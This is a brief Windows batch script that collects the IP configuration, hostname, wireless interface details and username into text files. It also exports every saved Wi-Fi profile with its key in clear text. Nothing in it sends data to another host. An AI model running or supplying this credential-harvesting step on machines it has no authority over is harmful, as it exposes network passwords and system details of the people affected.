del "Computer Info"
md "Computer Info"
cd "Computer Info"
md "Networks"
ipconfig > ip.txt
hostname > computername.txt
netsh wlan show interfaces > network.txt
echo %username% > username.txt
netsh wlan export profile folder="Networks" key=clear
